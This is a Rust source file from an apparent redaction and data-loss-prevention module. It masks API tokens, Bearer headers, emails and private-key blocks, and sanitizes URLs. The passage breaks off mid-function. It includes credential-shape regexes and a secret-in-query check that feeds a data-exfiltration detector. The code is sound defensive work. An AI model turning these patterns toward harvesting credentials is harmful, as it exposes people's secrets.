use once_cell::sync::Lazy;
use regex::Regex;

/// Credential redaction entry: `prefix_len` chars stay visible, rest → [REDACTED].
struct CredRedactEntry {
    label: String,
    regex: Regex,
    prefix_len: usize,
}

/// Target audience for [`redact_for_audience`]. Controls WHAT is redacted on top
/// of credentials (which are ALWAYS redacted):
/// - `PublicPaste` — most aggressive: internal hostnames, home paths, RFC1918
///   IPs in hostname context, plus all creds + customer IDs.
/// - `Llm` / `Generic` — secrets only; preserve stack traces / line numbers /
///   repo paths (an LLM needs them to debug).
/// - `Slack` / `GithubIssue` — secrets + internal hostnames, but keep
///   repo-relative paths.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShareAudience {
    GithubIssue,
    Slack,
    Llm,
    PublicPaste,
    Generic,
}

impl ShareAudience {
    /// The token used in `share_patterns.toml`'s `audiences` array
    /// (case-sensitive). The CLI parses strings via [`Self::parse_cli`].
    fn toml_token(self) -> &'static str {
        match self {
            ShareAudience::GithubIssue => "github-issue",
            ShareAudience::Slack => "slack",
            ShareAudience::Llm => "llm",
            ShareAudience::PublicPaste => "public-paste",
            ShareAudience::Generic => "generic",
        }
    }

    /// Parse a `--target` / `--audience` CLI string (`None` on unknown).
    pub fn parse_cli(s: &str) -> Option<ShareAudience> {
        match s.trim() {
            "github-issue" | "githubissue" | "github" => Some(ShareAudience::GithubIssue),
            "slack" => Some(ShareAudience::Slack),
            "llm" => Some(ShareAudience::Llm),
            "public-paste" | "publicpaste" | "public" => Some(ShareAudience::PublicPaste),
            "generic" => Some(ShareAudience::Generic),
            _ => None,
        }
    }

    /// Human-readable list of accepted CLI values (for error messages).
    pub fn cli_values() -> &'static [&'static str] {
        &["github-issue", "slack", "llm", "public-paste", "generic"]
    }
}

/// One labeled redaction count from [`redact_for_audience`] (stable snake_case
/// `label` + number of matches replaced).
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct RedactionCount {
    pub label: String,
    pub count: usize,
}

/// Output of [`redact_for_audience`]: redacted content + per-label counts.
#[derive(Debug, Clone, serde::Serialize)]
pub struct RedactReport {
    pub redacted_content: String,
    pub redactions: Vec<RedactionCount>,
}

impl RedactReport {
    /// Sum of all per-label counts.
    pub fn total(&self) -> usize {
        self.redactions.iter().map(|r| r.count).sum()
    }
}

/// A share-pattern entry loaded from `share_patterns.toml`.
struct SharePatternEntry {
    label: String,
    regex: Regex,
    /// Audience tokens this pattern applies to (strings, so unknown tokens are
    /// ignored forward-compatibly).
    audiences: Vec<String>,
}

static SHARE_PATTERNS: Lazy<Vec<SharePatternEntry>> = Lazy::new(|| {
    #[derive(serde::Deserialize)]
    struct File {
        pattern: Option<Vec<Pat>>,
    }
    #[derive(serde::Deserialize)]
    struct Pat {
        id: String,
        regex: String,
        audiences: Vec<String>,
    }

    let toml_str = include_str!("../assets/data/share_patterns.toml");
    let file: File = toml::from_str(toml_str).expect("invalid share_patterns.toml");

    let mut entries = Vec::new();
    if let Some(patterns) = file.pattern {
        for p in patterns {
            match Regex::new(&p.regex) {
                Ok(re) => entries.push(SharePatternEntry {
                    label: p.id,
                    regex: re,
                    audiences: p.audiences,
                }),
                Err(e) => {
                    eprintln!("tirith: warning: invalid share pattern '{}': {e}", p.id);
                }
            }
        }
    }
    entries
});

/// Credential patterns loaded from credential_patterns.toml at compile time.
static CREDENTIAL_REDACT_PATTERNS: Lazy<Vec<CredRedactEntry>> = Lazy::new(|| {
    #[derive(serde::Deserialize)]
    struct CredFile {
        pattern: Option<Vec<CredPat>>,
        private_key_pattern: Option<Vec<PkPat>>,
    }
    #[derive(serde::Deserialize)]
    struct CredPat {
        id: String,
        regex: String,
        redact_prefix_len: Option<usize>,
    }
    #[derive(serde::Deserialize)]
    struct PkPat {
        id: String,
        #[allow(dead_code)]
        regex: String,
        redact_regex: Option<String>,
    }

    let toml_str = include_str!("../assets/data/credential_patterns.toml");
    let cred_file: CredFile = toml::from_str(toml_str).expect("invalid credential_patterns.toml");

    let mut entries = Vec::new();
    if let Some(patterns) = cred_file.pattern {
        for p in patterns {
            if let Ok(re) = Regex::new(&p.regex) {
                entries.push(CredRedactEntry {
                    label: p.id,
                    regex: re,
                    prefix_len: p.redact_prefix_len.unwrap_or(4),
                });
            }
        }
    }
    if let Some(pk_patterns) = cred_file.private_key_pattern {
        for pk in pk_patterns {
            // `redact_regex` covers the full PEM block; fall back to the
            // header-only regex when omitted.
            let redact_pattern = pk.redact_regex.as_deref().unwrap_or(&pk.regex);
            if let Ok(re) = Regex::new(redact_pattern) {
                entries.push(CredRedactEntry {
                    label: pk.id,
                    regex: re,
                    prefix_len: 0,
                });
            }
        }
    }
    entries
});

/// Built-in redaction patterns: (label, regex).
static BUILTIN_PATTERNS: Lazy<Vec<(&'static str, Regex)>> = Lazy::new(|| {
    vec![
        (
            "OpenAI API Key",
            Regex::new(r"sk-[A-Za-z0-9]{20,}").unwrap(),
        ),
        ("AWS Access Key", Regex::new(r"AKIA[A-Z0-9]{16}").unwrap()),
        ("GitHub PAT", Regex::new(r"ghp_[A-Za-z0-9]{36,}").unwrap()),
        (
            "GitHub Server Token",
            Regex::new(r"ghs_[A-Za-z0-9]{36,}").unwrap(),
        ),
        (
            "Anthropic API Key",
            Regex::new(r"sk-ant-[A-Za-z0-9\-]{20,}").unwrap(),
        ),
        (
            "Slack Token",
            Regex::new(r"xox[bprs]-[A-Za-z0-9\-]{10,}").unwrap(),
        ),
        (
            "Email Address",
            Regex::new(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}").unwrap(),
        ),
    ]
});

/// Credential carried in an HTTP Authorization header. Provider-specific
/// token patterns are intentionally narrow, but a Bearer value is sensitive by
/// protocol regardless of its provider or alphabet (for example, JWTs and
/// hyphenated opaque tokens). Preserve only the header prefix.
static AUTHORIZATION_BEARER_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(\b(?:proxy-)?authorization[ \t]*:[ \t]*bearer[ \t]+)[A-Za-z0-9._~+/=-]+")
        .expect("static authorization bearer regex")
});

/// The credential-shape subset of [`BUILTIN_PATTERNS`] used by
/// [`looks_secret_shaped`]: OpenAI / AWS / GitHub / Anthropic / Slack tokens.
///
/// Deliberately EXCLUDES the Email regex (index 6 of `BUILTIN_PATTERNS`): a
/// secret-shape gate that matched `?email=foo@bar.com` would fire High false
/// positives on ordinary mailto links in agent output, which is the whole point
/// of carving this narrow set out instead of reusing `BUILTIN_PATTERNS` wholesale.
///
/// Each regex here is anchored with `\A`…`\z` because [`looks_secret_shaped`]
/// tests a single already-isolated token (a URL query-param value), not a free-
/// text haystack: an anchored full match avoids treating `prefix-sk-...suffix`
/// junk as a key while still matching a bare credential value.
static SECRET_SHAPE_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        r"\Ask-[A-Za-z0-9]{20,}\z",          // OpenAI API key
        r"\AAKIA[A-Z0-9]{16}\z",             // AWS access key id
        r"\Aghp_[A-Za-z0-9]{36,}\z",         // GitHub PAT
        r"\Aghs_[A-Za-z0-9]{36,}\z",         // GitHub server token
        r"\Ask-ant-[A-Za-z0-9\-]{20,}\z",    // Anthropic API key
        r"\Axox[bprs]-[A-Za-z0-9\-]{10,}\z", // Slack token
    ]
    .iter()
    .map(|p| Regex::new(p).expect("static secret-shape regex"))
    .collect()
});

/// Shannon entropy of `s` in bits per character (0.0 for the empty string).
/// Used by [`looks_secret_shaped`] to gate the generic long-opaque-token arm so a
/// low-entropy run (`aaaaaaaa…`, a repeated word) is not mistaken for a secret.
fn shannon_entropy_bits_per_char(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts: std::collections::HashMap<char, usize> = std::collections::HashMap::new();
    let mut total = 0usize;
    for c in s.chars() {
        *counts.entry(c).or_insert(0) += 1;
        total += 1;
    }
    let total = total as f64;
    counts
        .values()
        .map(|&n| {
            let p = n as f64 / total;
            -p * p.log2()
        })
        .sum()
}

/// `true` when `s` has the SHAPE of a leaked credential: a recognised provider
/// token (OpenAI / AWS / GitHub / Anthropic / Slack — see [`SECRET_SHAPE_PATTERNS`]),
/// OR a long opaque high-entropy token (`[A-Za-z0-9_-]{32,}` with Shannon entropy
/// >= 4.0 bits/char). The narrow set EXCLUDES email addresses on purpose.
///
/// Intended for an ALREADY-ISOLATED token (e.g. a single URL query-param value),
/// not a free-text scan: the provider patterns are anchored, and the generic arm
/// requires the WHOLE string to be one opaque token. This keeps the
/// `OutputDataExfiltration` "secret-in-query" detection low-false-positive
/// (`?page=2`, `?email=foo@bar.com`, `?q=hello+world` do not match).
pub fn looks_secret_shaped(s: &str) -> bool {
    if SECRET_SHAPE_PATTERNS.iter().any(|re| re.is_match(s)) {
        return true;
    }
    // Generic long opaque token: 32+ url-safe chars, no other byte classes, and
    // high entropy (a real random secret), so a long lowercase word or a repeated
    // run does not trip it.
    let len = s.chars().count();
    if len >= 32
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        && shannon_entropy_bits_per_char(s) >= 4.0
    {
        return true;
    }
    false
}

#[derive(Default)]
struct PrivateKeyRedactionCounts {
    pem: usize,
    pgp: usize,
}

/// Structurally redact every recognized PEM/PGP private-key block. Regex
/// backreferences are unavailable, so a single expression cannot require an
/// END label to equal its BEGIN label. Parse the label once and search for that
/// exact footer; if it is absent, consume through end-of-input.
fn redact_private_key_blocks(input: &str) -> (String, PrivateKeyRedactionCounts) {
    let (spans, counts) = private_key_block_spans(input);
    if spans.is_empty() {
        return (input.to_string(), counts);
    }

    let mut output = String::with_capacity(input.len());
    let mut copied_through = 0usize;
    for span in spans {
        output.push_str(&input[copied_through..span.start]);
        output.push_str("[REDACTED]");
        copied_through = span.end;
    }
    output.push_str(&input[copied_through..]);
    (output, counts)
}

/// Byte ranges occupied by structurally recognized private-key blocks. This is
/// crate-visible so consumers that must preserve original line identity can
/// use the exact same BEGIN/END grammar instead of leaking multiline bodies by
/// redacting each line independently.
pub(crate) fn private_key_redaction_spans(input: &str) -> Vec<std::ops::Range<usize>> {
    private_key_block_spans(input).0
}

fn private_key_block_spans(
    input: &str,
) -> (Vec<std::ops::Range<usize>>, PrivateKeyRedactionCounts) {
    const BEGIN: &str = "-----BEGIN";
    let mut spans = Vec::new();
    let mut counts = PrivateKeyRedactionCounts::default();
    let mut search_from = 0usize;

    while let Some(relative) = input[search_from..].find(BEGIN) {
        let start = search_from + relative;
        let after_begin = start + BEGIN.len();
        let Some(separator) = input[after_begin..].chars().next() else {
            break;
        };
        if !separator.is_whitespace() {
            search_from = start + 1;
            continue;
        }
        let label_start = after_begin + separator.len_utf8();
        let Some(label_end_relative) = input[label_start..].find("-----") else {
            break;
        };
        let label_end = label_start + label_end_relative;
        let label = &input[label_start..label_end];
        let is_pgp = label == "PGP PRIVATE KEY BLOCK";
        let is_pem = label.ends_with("PRIVATE KEY")
            && label
                .chars()
                .all(|ch| ch.is_ascii_uppercase() || ch.is_ascii_digit() || ch == ' ');
        if !is_pgp && !is_pem {
            // Do not let a malformed earlier BEGIN consume or hide a later
            // valid marker.
            search_from = start + 1;
            continue;
        }

        let header_end = label_end + 5;
        let block_end =
            find_matching_private_key_footer(input, header_end, label).unwrap_or(input.len());
        spans.push(start..block_end);
        if is_pgp {
            counts.pgp += 1;
        } else {
            counts.pem += 1;
        }
        search_from = block_end;
    }

    (spans, counts)
}

fn find_matching_private_key_footer(
    input: &str,
    from: usize,
    expected_label: &str,
) -> Option<usize> {
    const END: &str = "-----END";
    let mut search_from = from;
    while let Some(relative) = input[search_from..].find(END) {
        let start = search_from + relative;
        let after_end = start + END.len();
        let separator = input[after_end..].chars().next()?;
        if !separator.is_whitespace() {
            search_from = start + 1;
            continue;
        }
        let label_start = after_end + separator.len_utf8();
        let label_end_relative = input[label_start..].find("-----")?;
        let label_end = label_start + label_end_relative;
        if &input[label_start..label_end] == expected_label {
            return Some(label_end + 5);
        }
        search_from = start + 1;
    }
    None
}

/// Redact sensitive content from a string using built-in and credential patterns.
pub fn redact(input: &str) -> String {
    let (mut result, _) = redact_private_key_blocks(input);
    result = AUTHORIZATION_BEARER_PATTERN
        .replace_all(&result, |captures: &regex::Captures| {
            format!("{}[REDACTED:Bearer Token]", &captures[1])
        })
        .into_owned();
    // Built-ins first (labeled replacements like `[REDACTED:Foo]`).
    for (label, regex) in BUILTIN_PATTERNS.iter() {
        result = regex
            .replace_all(&result, format!("[REDACTED:{label}]"))
            .into_owned();
    }
    // Credential patterns afterwards, preserving a short prefix.
    for entry in CREDENTIAL_REDACT_PATTERNS.iter() {
        result = entry
            .regex
            .replace_all(&result, |caps: &regex::Captures| {
                let matched = &caps[0];
                let prefix: String = matched.chars().take(entry.prefix_len).collect();
                format!("{prefix}[REDACTED]")
            })
            .into_owned();
    }
    result
}

/// M11 ch3 — the canary-detection scan driving
/// [`crate::verdict::RuleId::CanaryTokenTouched`]. Returns one
/// [`crate::canary::CanaryHit`] per REGISTERED token found (deduped by id); the
/// single entry point for both the analyze and analyze_output paths.
///
/// A STORE lookup, not a shape match: only registered tokens match (an unrelated
/// real credential fires `CredentialInText`/`HighEntropySecret` instead).
/// Near-noop when the store is empty/absent. The token value is NEVER returned —
/// only id/kind/callback — so this can't leak a planted secret.
pub fn detect_canaries(input: &str) -> Vec<crate::canary::CanaryHit> {
    crate::canary::detect(input)
}

/// Maximum UTF-8 byte length accepted for a policy-provided DLP regex.
pub(crate) const MAX_CUSTOM_DLP_PATTERN_BYTES: usize = 1024;
/// Maximum number of policy-provided DLP regexes evaluated in one redaction.
pub(crate) const MAX_CUSTOM_DLP_PATTERNS: usize = 128;
/// Maximum raw regex matches collected before deterministic overlap merging.
pub(crate) const MAX_CUSTOM_DLP_MATCHES: usize = 4096;
/// Maximum bytes a one-pass custom replacement may add to its input.
pub(crate) const MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES: usize = 32 * 1024;

const CUSTOM_REDACTION_MARKER: &str = "[REDACTED:custom]";
const CUSTOMER_ID_REDACTION_MARKER: &str = "[REDACTED:customer_id]";
const INCOMPLETE_REDACTION_MARKER: &str = "[REDACTED:incomplete]";

/// Why a policy-provided DLP regex cannot be used at runtime.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CustomDlpPatternError {
    TooLong {
        actual_bytes: usize,
        max_bytes: usize,
    },
    InvalidRegex,
    /// The regex can match without consuming input, so replacement would be
    /// insertion rather than redaction and could amplify output.
    ZeroWidthMatch,
}

impl std::fmt::Display for CustomDlpPatternError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TooLong {
                actual_bytes,
                max_bytes,
            } => write!(
                f,
                "pattern too long ({actual_bytes} bytes, max {max_bytes})"
            ),
            Self::InvalidRegex => write!(f, "invalid regex"),
            Self::ZeroWidthMatch => write!(f, "pattern can match zero-width input"),
        }
    }
}

impl std::error::Error for CustomDlpPatternError {}

/// A custom-redaction plan could not prove complete, bounded coverage.
///
/// Checked callers receive this typed outcome. The compatibility wrappers in
/// this module deliberately replace the entire secret-bearing value with
/// `[REDACTED:incomplete]` instead of returning partial output.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RedactionIncomplete {
    PatternLimitExceeded {
        actual: usize,
        max: usize,
    },
    PatternRejected {
        index: usize,
        error: CustomDlpPatternError,
    },
    MatchLimitExceeded {
        actual_at_least: usize,
        max: usize,
    },
    OutputOverheadExceeded {
        actual_bytes: usize,
        max_bytes: usize,
    },
}

impl std::fmt::Display for RedactionIncomplete {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PatternLimitExceeded { actual, max } => {
                write!(f, "too many patterns ({actual}, max {max})")
            }
            Self::PatternRejected { index, error } => {
                write!(f, "pattern at index {index} rejected: {error}")
            }
            Self::MatchLimitExceeded {
                actual_at_least,
                max,
            } => write!(
                f,
                "too many matches (at least {actual_at_least}, max {max})"
            ),
            Self::OutputOverheadExceeded {
                actual_bytes,
                max_bytes,
            } => write!(
                f,
                "replacement output overhead too large ({actual_bytes} bytes, max {max_bytes})"
            ),
        }
    }
}

impl std::error::Error for RedactionIncomplete {}

/// Compile one policy-provided DLP regex using the runtime acceptance contract.
pub(crate) fn compile_custom_dlp_pattern(pattern: &str) -> Result<Regex, CustomDlpPatternError> {
    let actual_bytes = pattern.len();
    if actual_bytes > MAX_CUSTOM_DLP_PATTERN_BYTES {
        return Err(CustomDlpPatternError::TooLong {
            actual_bytes,
            max_bytes: MAX_CUSTOM_DLP_PATTERN_BYTES,
        });
    }

    // `Regex::is_match("")` misses boundary-only forms such as `\b`. The HIR
    // property is computed for the whole regular language and therefore rejects
    // every expression whose minimum possible match consumes zero bytes.
    let hir = regex_syntax::parse(pattern).map_err(|_| CustomDlpPatternError::InvalidRegex)?;
    if hir.properties().minimum_len() == Some(0) {
        return Err(CustomDlpPatternError::ZeroWidthMatch);
    }
    Regex::new(pattern).map_err(|_| CustomDlpPatternError::InvalidRegex)
}

fn compile_custom_dlp_patterns(raw_patterns: &[String]) -> Result<Vec<Regex>, RedactionIncomplete> {
    if raw_patterns.len() > MAX_CUSTOM_DLP_PATTERNS {
        return Err(RedactionIncomplete::PatternLimitExceeded {
            actual: raw_patterns.len(),
            max: MAX_CUSTOM_DLP_PATTERNS,
        });
    }
    raw_patterns
        .iter()
        .enumerate()
        .map(|(index, pattern)| {
            compile_custom_dlp_pattern(pattern)
                .map_err(|error| RedactionIncomplete::PatternRejected { index, error })
        })
        .collect()
}

fn warn_incomplete_custom_redaction(pattern_kind: &str, error: &RedactionIncomplete) {
    eprintln!(
        "tirith: warning: {pattern_kind} redaction incomplete ({error}); fully redacting value"
    );
}

/// Pre-compiled set of custom DLP patterns.
pub struct CompiledCustomPatterns {
    patterns: Vec<Regex>,
    incomplete: Option<RedactionIncomplete>,
}

impl CompiledCustomPatterns {
    /// Compile custom DLP patterns once for reuse across calls. Invalid or
    /// over-budget sets remain explicitly incomplete, causing every subsequent
    /// compatibility-wrapper redaction to fail closed.
    pub fn new(raw_patterns: &[String]) -> Self {
        let compiled = Self::new_silent(raw_patterns);
        if let Some(error) = compiled.incomplete_reason() {
            warn_incomplete_custom_redaction("custom DLP", error);
        }
        compiled
    }

    /// Compile once without writing diagnostics directly. Multi-item output
    /// surfaces use this constructor and route one bounded diagnostic through
    /// their own invocation writer.
    pub fn new_silent(raw_patterns: &[String]) -> Self {
        match Self::try_new(raw_patterns) {
            Ok(compiled) => compiled,
            Err(error) => Self {
                patterns: Vec::new(),
                incomplete: Some(error),
            },
        }
    }

    /// Checked constructor for callers that need the typed incomplete reason.
    pub fn try_new(raw_patterns: &[String]) -> Result<Self, RedactionIncomplete> {
        Ok(Self {
            patterns: compile_custom_dlp_patterns(raw_patterns)?,
            incomplete: None,
        })
    }

    pub fn incomplete_reason(&self) -> Option<&RedactionIncomplete> {
        self.incomplete.as_ref()
    }
}

#[derive(Debug, Clone, Copy)]
struct MatchInterval {
    start: usize,
    end: usize,
}

/// Apply every regex to the SAME input, merge overlapping byte intervals, then
/// render exactly once. Replacement text can therefore never become input to a
/// later policy regex.
fn apply_custom_patterns_once(
    input: &str,
    patterns: &[Regex],
    replacement: &str,
) -> Result<(String, usize), RedactionIncomplete> {
    let mut intervals = Vec::new();
    for (index, regex) in patterns.iter().enumerate() {
        for matched in regex.find_iter(input) {
            if matched.start() == matched.end() {
                return Err(RedactionIncomplete::PatternRejected {
                    index,
                    error: CustomDlpPatternError::ZeroWidthMatch,
                });
            }
            if intervals.len() == MAX_CUSTOM_DLP_MATCHES {
                return Err(RedactionIncomplete::MatchLimitExceeded {
                    actual_at_least: MAX_CUSTOM_DLP_MATCHES + 1,
                    max: MAX_CUSTOM_DLP_MATCHES,
                });
            }
            intervals.push(MatchInterval {
                start: matched.start(),
                end: matched.end(),
            });
        }
    }

    if intervals.is_empty() {
        return Ok((input.to_string(), 0));
    }

    intervals.sort_unstable_by_key(|interval| (interval.start, interval.end));
    let mut merged: Vec<MatchInterval> = Vec::with_capacity(intervals.len());
    for interval in intervals {
        if let Some(last) = merged.last_mut() {
            if interval.start < last.end {
                last.end = last.end.max(interval.end);
                continue;
            }
        }
        merged.push(interval);
    }

    let removed_bytes: usize = merged.iter().map(|m| m.end - m.start).sum();
    let replacement_bytes = replacement.len().saturating_mul(merged.len());
    let projected_bytes = input
        .len()
        .saturating_sub(removed_bytes)
        .saturating_add(replacement_bytes);
    let overhead = projected_bytes.saturating_sub(input.len());
    if overhead > MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES {
        return Err(RedactionIncomplete::OutputOverheadExceeded {
            actual_bytes: overhead,
            max_bytes: MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES,
        });
    }

    let mut output = String::with_capacity(projected_bytes);
    let mut cursor = 0;
    for interval in &merged {
        output.push_str(&input[cursor..interval.start]);
        output.push_str(replacement);
        cursor = interval.end;
    }
    output.push_str(&input[cursor..]);
    Ok((output, merged.len()))
}

/// Checked redaction using built-in and policy-provided custom patterns.
pub fn try_redact_with_custom(
    input: &str,
    custom_patterns: &[String],
) -> Result<String, RedactionIncomplete> {
    let compiled = CompiledCustomPatterns::try_new(custom_patterns)?;
    try_redact_with_compiled(input, &compiled)
}

/// Redact using both built-in and custom patterns from policy. Any incomplete
/// policy plan fails closed by replacing the entire value.
pub fn redact_with_custom(input: &str, custom_patterns: &[String]) -> String {
    match try_redact_with_custom(input, custom_patterns) {
        Ok(redacted) => redacted,
        Err(error) => {
            warn_incomplete_custom_redaction("custom DLP", &error);
            INCOMPLETE_REDACTION_MARKER.to_string()
        }
    }
}

/// Checked redaction using built-in + pre-compiled custom patterns.
pub fn try_redact_with_compiled(
    input: &str,
    compiled: &CompiledCustomPatterns,
) -> Result<String, RedactionIncomplete> {
    if let Some(error) = &compiled.incomplete {
        return Err(error.clone());
    }
    let (private_safe, _) = redact_private_key_blocks(input);
    let (custom_redacted, _) =
        apply_custom_patterns_once(&private_safe, &compiled.patterns, CUSTOM_REDACTION_MARKER)?;
    Ok(redact(&custom_redacted))
}

/// Redact using built-in + pre-compiled custom patterns (no per-call recompile).
/// An incomplete compiled set fails closed for the whole value.
pub fn redact_with_compiled(input: &str, compiled: &CompiledCustomPatterns) -> String {
    match try_redact_with_compiled(input, compiled) {
        Ok(redacted) => redacted,
        Err(_) => INCOMPLETE_REDACTION_MARKER.to_string(),
    }
}

/// Apply the safe terminal-boundary order for attacker-controlled text:
/// redact, remove terminal/deception controls, then redact again.
///
/// The second pass is load-bearing. Removing an ANSI or invisible separator can
/// reconstitute a credential that was not contiguous during the first pass.
/// Callers should bound/flatten only after this helper returns.
pub fn redact_sanitize_redact_with_compiled(
    input: &str,
    compiled: &CompiledCustomPatterns,
) -> String {
    let redacted = redact_with_compiled(input, compiled);
    let sanitized = crate::mcp::output_filter::sanitize_for_display(&redacted);
    redact_with_compiled(&sanitized, compiled)
}

/// Compile policy custom patterns once for a single terminal-boundary value and
/// apply [`redact_sanitize_redact_with_compiled`].
pub fn redact_sanitize_redact(input: &str, custom_patterns: &[String]) -> String {
    let compiled = CompiledCustomPatterns::new(custom_patterns);
    redact_sanitize_redact_with_compiled(input, &compiled)
}

/// Preserve command-assignment/private-key scrubbing, then apply the shared
/// redact-sanitize-redact boundary. This is the public-output counterpart to
/// [`redact_command_text_with_compiled`].
pub fn redact_sanitize_redact_command_with_compiled(
    input: &str,
    compiled: &CompiledCustomPatterns,
) -> String {
    let command_safe = redact_command_text_with_compiled(input, compiled);
    redact_sanitize_redact_with_compiled(&command_safe, compiled)
}

/// Maximum number of Unicode scalar values retained from one untrusted
/// provenance/receipt field. A trailing ellipsis may add one character.
pub const PROVENANCE_MAX_CHARS: usize = 256;

/// Apply built-in and frozen custom DLP redaction, remove terminal/deception
/// controls, flatten row-breaking whitespace, and cap one untrusted field.
pub fn sanitize_provenance_text_with_compiled(
    value: &str,
    compiled: &CompiledCustomPatterns,
) -> String {
    let cleaned = redact_sanitize_redact_with_compiled(value, compiled);
    let flattened: String = cleaned
        .chars()
        .map(|character| {
            if character.is_whitespace() {
                ' '
            } else {
                character
            }
        })
        .collect();
    cap_provenance_chars(flattened.trim(), PROVENANCE_MAX_CHARS)
}

/// Sanitize an untrusted URL for public provenance/receipt output. Userinfo,
/// query, fragment, and hosted-RPC credential paths are removed structurally
/// before the shared text DLP/control/cap pass.
pub fn sanitize_provenance_url_with_compiled(
    value: &str,
    compiled: &CompiledCustomPatterns,
) -> String {
    let structurally_safe = match url::Url::parse(value) {
        Ok(mut parsed) => {
            parsed.set_query(None);
            parsed.set_fragment(None);
            let _ = parsed.set_username("");
            let _ = parsed.set_password(None);
            strip_secret_provider_path(&mut parsed);
            parsed.to_string()
        }
        Err(_) => {
            let without_userinfo = crate::receipt::redact_url_userinfo(value);
            let end = without_userinfo
                .find(['?', '#'])
                .unwrap_or(without_userinfo.len());
            without_userinfo[..end].to_string()
        }
    };
    sanitize_provenance_text_with_compiled(&structurally_safe, compiled)
}

fn strip_secret_provider_path(parsed: &mut url::Url) {
    let host = parsed.host_str().unwrap_or_default().to_ascii_lowercase();
    let provider_host = [
        "alchemy.com",
        "ankr.com",
        "blastapi.io",
        "chainstack.com",
        "drpc.org",
        "getblock.io",
        "infura.io",
        "llamarpc.com",
        "moralis.io",
        "quicknode.com",
        "quiknode.pro",
        "tenderly.co",
    ]
    .iter()
    .any(|suffix| host == *suffix || host.ends_with(&format!(".{suffix}")));

    let segments = parsed
        .path_segments()
        .map(|segments| {
            segments
                .filter(|segment| !segment.is_empty())
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    if segments.is_empty() {
        return;
    }
    if provider_host {
        if matches!(segments.first().copied(), Some("v2" | "v3")) {
            parsed.set_path(&format!("/{}", segments[0]));
        } else {
            parsed.set_path("/");
        }
        return;
    }
    if segments.len() >= 2
        && matches!(segments[0], "v2" | "v3")
        && looks_like_secret_path_segment(segments[1])
    {
        parsed.set_path(&format!("/{}", segments[0]));
    }
}

fn looks_like_secret_path_segment(segment: &str) -> bool {
    segment.len() >= 16
        && segment.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'%' | b'~')
        })
}

fn cap_provenance_chars(value: &str, max: usize) -> String {
    if value.chars().count() <= max {
        return value.to_string();
    }
    let mut bounded: String = value.chars().take(max).collect();
    bounded.push('…');
    bounded
}

/// Stable snake_case label for a built-in pattern (consumed by `--json` and the
/// stderr summary, not the prose `[REDACTED:Name]` token).
fn builtin_label_for(idx: usize) -> &'static str {
    match idx {
        0 => "openai_api_key",
        1 => "aws_access_key_builtin",
        2 => "github_pat_builtin",
        3 => "github_server_token",
        4 => "anthropic_api_key_builtin",
        5 => "slack_token_builtin",
        6 => "email_address",
        _ => "builtin_secret",
    }
}

/// Audience-aware redaction. Always strips credentials, plus the
/// `share_patterns.toml` patterns matching the audience.
///
/// `PublicPaste` extras: internal hostnames, home paths, and RFC1918 IPv4 in
/// hostname context (public IPs like `1.1.1.1` are NOT touched). `Llm`/`Generic`
/// strip secrets only — preserving stack traces / paths / line numbers is
/// intentional (over-redaction starves the LLM of debug context).
pub fn redact_for_audience(input: &str, audience: ShareAudience) -> RedactReport {
    redact_for_audience_with_custom(input, audience, &[])
}

/// Like [`redact_for_audience`] but also redacts `policy.share.
/// customer_id_patterns`, all aggregated under the `customer_id` label.
pub fn redact_for_audience_with_custom(
    input: &str,
    audience: ShareAudience,
    customer_id_patterns: &[String],
) -> RedactReport {
    match try_redact_for_audience_with_custom(input, audience, customer_id_patterns) {
        Ok(report) => report,
        Err(error) => {
            warn_incomplete_custom_redaction("customer_id", &error);
            RedactReport {
                redacted_content: INCOMPLETE_REDACTION_MARKER.to_string(),
                redactions: vec![RedactionCount {
                    label: "redaction_incomplete".to_string(),
                    count: 1,
                }],
            }
        }
    }
}

/// Checked audience-aware redaction. A rejected or over-budget customer-ID
/// pattern set returns a typed incomplete outcome without exposing partial text.
pub fn try_redact_for_audience_with_custom(
    input: &str,
    audience: ShareAudience,
    customer_id_patterns: &[String],
) -> Result<RedactReport, RedactionIncomplete> {
    use std::collections::HashMap;

    let customer_id_patterns = CompiledCustomPatterns::try_new(customer_id_patterns)?;
    let mut counts: HashMap<String, usize> = HashMap::new();
    let mut order: Vec<String> = Vec::new();
    let bump =
        |label: &str, n: usize, counts: &mut HashMap<String, usize>, order: &mut Vec<String>| {
            if n == 0 {
                return;
            }
            if !counts.contains_key(label) {
                order.push(label.to_string());
            }
            *counts.entry(label.to_string()).or_insert(0) += n;
        };

    // 1. Private keys go first because an operator custom pattern must never be
    // able to rewrite the BEGIN header and expose the remaining key body.
    // Customer IDs are then planned once over that structurally safe input;
    // later built-in/static replacements never become operator-regex input.
    let (private_safe, private_counts) = redact_private_key_blocks(input);
    let (mut result, customer_id_matches) = apply_custom_patterns_once(
        &private_safe,
        &customer_id_patterns.patterns,
        CUSTOMER_ID_REDACTION_MARKER,
    )?;

    bump("private_key", private_counts.pem, &mut counts, &mut order);
    bump(
        "pgp_private_key",
        private_counts.pgp,
        &mut counts,
        &mut order,
    );

    // `Authorization: Bearer` values are sensitive by protocol, so they are
    // redacted here as well as in `redact()` — the narrow provider patterns
    // below do not recognize JWT or opaque bearer alphabets.
    let bearer_matches = AUTHORIZATION_BEARER_PATTERN.find_iter(&result).count();
    if bearer_matches > 0 {
        result = AUTHORIZATION_BEARER_PATTERN
            .replace_all(&result, |captures: &regex::Captures| {
                format!("{}[REDACTED:Bearer Token]", &captures[1])
            })
            .into_owned();
        bump("bearer_token", bearer_matches, &mut counts, &mut order);
    }

